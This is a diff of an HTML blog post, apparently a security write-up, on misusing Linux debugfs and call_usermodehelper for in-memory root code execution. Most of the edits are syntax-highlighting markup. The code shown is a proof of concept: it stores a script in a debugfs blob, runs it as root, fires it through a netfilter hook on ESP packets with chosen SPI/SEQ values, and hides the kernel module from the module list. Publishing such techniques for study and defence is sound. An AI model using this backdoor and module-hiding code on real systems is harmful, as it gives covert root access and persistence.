@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="author" content="Nick Bulischeck">
 <meta name="description" content="Yet Another Cybersecurity Blog">
-<meta name="generator" content="Hugo 0.63.2" />
+<meta name="generator" content="Hugo 0.70.0" />
 <title>Misusing debugfs for In-Memory Code Execution</title>
 <link rel="shortcut icon" href="https://nbulischeck.io/images/favicon.ico">
 <link rel="stylesheet" href="https://nbulischeck.io/css/style.css">
@@ -177,6 +177,7 @@
 </tr>
 </tbody>
 </table>
+
 </div>
 
 <ul>
@@ -193,20 +194,20 @@
 <span style="color:#66d9ef">struct</span> debugfs_blob_wrapper <span style="color:#f92672">*</span>myblob <span style="color:#f92672">=</span> NULL;
 
 <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">create_file</span>(<span style="color:#66d9ef">void</span>){
-	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">\
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">#!/usr/bin/env python</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">with open(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/tmp/i_am_groot</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">w+</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">) as f:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">	f.write(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Hello, world!</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">&#34;</span>;
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\
+</span><span style="color:#e6db74">#!/usr/bin/env python</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
+</span><span style="color:#e6db74">with open(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/tmp/i_am_groot</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">w+</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">) as f:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
+</span><span style="color:#e6db74">	f.write(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Hello, world!</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>;
 
 	myblob <span style="color:#f92672">=</span> kmalloc(<span style="color:#66d9ef">sizeof</span> <span style="color:#f92672">*</span>myblob, GFP_KERNEL);
 	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>myblob){
 		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
 	}
 
-	myblob<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>data <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) buffer;
-	myblob<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) strlen(buffer);
+	myblob<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) buffer;
+	myblob<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) strlen(buffer);
 
-	dfs <span style="color:#f92672">=</span> debugfs_create_blob(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug_exec</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0777</span>, NULL, myblob);
+	dfs <span style="color:#f92672">=</span> debugfs_create_blob(<span style="color:#e6db74">&#34;debug_exec&#34;</span>, <span style="color:#ae81ff">0777</span>, NULL, myblob);
 	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>dfs){
 		kfree(myblob);
 		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
@@ -223,14 +224,14 @@
 <p>To use <code>call_usermodehelper</code> we set up our <code>argv</code> and <code>envp</code> arrays and then call the function. The last flag determines how the kernel should continue after executing the function (&ldquo;Should I wait or should I move on?&quot;). For the unfamiliar, the <code>envp</code> array holds the environment variables of a process. The file we created above and now want to execute is <code>/sys/kernel/debug/debug_exec</code>. We can do this with the code below.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">execute_file</span>(<span style="color:#66d9ef">void</span>){
 	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> {
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SHELL=/bin/bash</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PATH=/usr/local/sbin:/usr/local/bin:</span><span style="color:#e6db74">&#34;</span>\
-			<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/sbin:/usr/bin:/sbin:/bin</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74">&#34;SHELL=/bin/bash&#34;</span>,
+		<span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:&#34;</span>\
+			<span style="color:#e6db74">&#34;/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,
 		NULL
 	};
 
 	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/sys/kernel/debug/debug_exec</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74">&#34;/sys/kernel/debug/debug_exec&#34;</span>,
 		NULL
 	};
 
@@ -267,12 +268,12 @@ ip_header <span style="color:#f92672">=</span> (<span style="color:#66d9ef">stru
 	<span style="color:#66d9ef">return</span> NF_ACCEPT;
 }
 </code></pre></div><p>Next we need to check if the protocol of the packet we received is an ESP packet or not. This can be done extremely easily now that we have the header.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">if</span> (ip_header<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>protocol <span style="color:#f92672">=</span><span style="color:#f92672">=</span> IPPROTO_ESP){
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">if</span> (ip_header<span style="color:#f92672">-&gt;</span>protocol <span style="color:#f92672">==</span> IPPROTO_ESP){
 	<span style="color:#75715e">// Packet is an ESP packet
 </span><span style="color:#75715e"></span>}
 </code></pre></div><p>ESP Packets contain two important values in their header. The two values are SPI and SEQ. SPI stands for Security Parameters Index and SEQ stands for Sequence. Both are technically arbitrary initially, but it is expected that the sequence number be incremented each packet. We can use these values to define which packets are our trigger packets. If a packet matches the correct SPI and SEQ values, we will perform our action.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">if</span> ((esp_header<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>spi <span style="color:#f92672">=</span><span style="color:#f92672">=</span> TARGET_SPI) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span>
-	(esp_header<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>seq_no <span style="color:#f92672">=</span><span style="color:#f92672">=</span> TARGET_SEQ)){
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">if</span> ((esp_header<span style="color:#f92672">-&gt;</span>spi <span style="color:#f92672">==</span> TARGET_SPI) <span style="color:#f92672">&amp;&amp;</span>
+	(esp_header<span style="color:#f92672">-&gt;</span>seq_no <span style="color:#f92672">==</span> TARGET_SEQ)){
 	<span style="color:#75715e">// Trigger packet arrived
 </span><span style="color:#75715e"></span>}
 </code></pre></div><p>Once you&rsquo;ve identified the target packet, you can extract the ESP data using the struct&rsquo;s member <code>enc_data</code>. Ideally, this would be encrypted thus ensuring the privacy of the code you&rsquo;re running on the target computer, but for the sake of simplicity in the PoC I left it out.</p>
@@ -288,18 +289,18 @@ ip_header <span style="color:#f92672">=</span> (<span style="color:#66d9ef">stru
 <p>Anything that contains an interpreter directive (python, ruby, perl, etc.) works together when calling <code>call_usermodehelper</code> on it. See <a href="https://en.wikipedia.org/wiki/Shebang_(Unix)">this wikipedia article</a> for more information on the interpreter directive.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">execute_file</span>(<span style="color:#66d9ef">void</span>){
 	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> {
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SHELL=/bin/bash</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">HOME=/root/</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">USER=root</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PATH=/usr/local/sbin:/usr/local/bin:</span><span style="color:#e6db74">&#34;</span>\
-			<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/sbin:/usr/bin:/sbin:/bin</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DISPLAY=:0</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PWD=/</span><span style="color:#e6db74">&#34;</span>, 
+		<span style="color:#e6db74">&#34;SHELL=/bin/bash&#34;</span>,
+		<span style="color:#e6db74">&#34;HOME=/root/&#34;</span>,
+		<span style="color:#e6db74">&#34;USER=root&#34;</span>,
+		<span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:&#34;</span>\
+			<span style="color:#e6db74">&#34;/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,
+		<span style="color:#e6db74">&#34;DISPLAY=:0&#34;</span>,
+		<span style="color:#e6db74">&#34;PWD=/&#34;</span>, 
 		NULL
 	};
 
 	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/sys/kernel/debug/debug_exec</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74">&#34;/sys/kernel/debug/debug_exec&#34;</span>,
 		NULL
 	};
 
@@ -308,20 +309,20 @@ ip_header <span style="color:#f92672">=</span> (<span style="color:#66d9ef">stru
 </code></pre></div><p>Go also works, but it&rsquo;s arguably not entirely in RAM as it has to make a temp file to build it and it also requires the <code>.go</code> file extension making this a little more obvious.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">execute_file</span>(<span style="color:#66d9ef">void</span>){
 	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> {
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SHELL=/bin/bash</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">HOME=/root/</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">USER=root</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PATH=/usr/local/sbin:/usr/local/bin:</span><span style="color:#e6db74">&#34;</span>\
-			<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/sbin:/usr/bin:/sbin:/bin</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DISPLAY=:0</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PWD=/</span><span style="color:#e6db74">&#34;</span>, 
+		<span style="color:#e6db74">&#34;SHELL=/bin/bash&#34;</span>,
+		<span style="color:#e6db74">&#34;HOME=/root/&#34;</span>,
+		<span style="color:#e6db74">&#34;USER=root&#34;</span>,
+		<span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:&#34;</span>\
+			<span style="color:#e6db74">&#34;/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,
+		<span style="color:#e6db74">&#34;DISPLAY=:0&#34;</span>,
+		<span style="color:#e6db74">&#34;PWD=/&#34;</span>, 
 		NULL
 	};
 
 	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/bin/go</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">run</span><span style="color:#e6db74">&#34;</span>,
-		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/sys/kernel/debug/debug_exec.go</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74">&#34;/usr/bin/go&#34;</span>,
+		<span style="color:#e6db74">&#34;run&#34;</span>,
+		<span style="color:#e6db74">&#34;/sys/kernel/debug/debug_exec.go&#34;</span>,
 		NULL
 	};
 
@@ -334,16 +335,16 @@ ip_header <span style="color:#f92672">=</span> (<span style="color:#66d9ef">stru
 
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">module_unhide</span>(<span style="color:#66d9ef">void</span>){
 	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>module_visible){
-		list_add(<span style="color:#f92672">&amp;</span>(<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>list, module);
-		module_visible<span style="color:#f92672">+</span><span style="color:#f92672">+</span>;
+		list_add(<span style="color:#f92672">&amp;</span>(<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-&gt;</span>list, module);
+		module_visible<span style="color:#f92672">++</span>;
 	}
 }
 
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">module_hide</span>(<span style="color:#66d9ef">void</span>){
 	<span style="color:#66d9ef">if</span> (module_visible){
-		module <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>list.prev;
-		list_del(<span style="color:#f92672">&amp;</span>(<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>list);
-		module_visible<span style="color:#f92672">-</span><span style="color:#f92672">-</span>;
+		module <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-&gt;</span>list.prev;
+		list_del(<span style="color:#f92672">&amp;</span>(<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-&gt;</span>list);
+		module_visible<span style="color:#f92672">--</span>;
 	}
 }
 </code></pre></div><h2 id="mitigation">Mitigation</h2>
